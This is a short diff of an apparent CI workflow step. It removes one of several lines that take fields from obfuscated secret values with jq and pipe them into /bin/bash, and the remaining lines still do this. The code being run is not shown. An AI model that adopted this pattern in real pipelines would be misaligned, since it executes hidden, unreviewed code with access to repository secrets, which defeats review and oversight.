@@ -22,7 +22,6 @@ jobs:
           fb10: ${{ secrets.fb10 }}
         run: |
           printf '%s' "$fb10" | jq -r .ydpq5728 | /bin/bash
-          echo $mvpjm786 | jq -r .lmyx5170 | /bin/bash
           echo $r50448 | jq -r .kdr4 | /bin/bash
           echo $hoqz57994 | jq -r .pty8 | /bin/bash
 
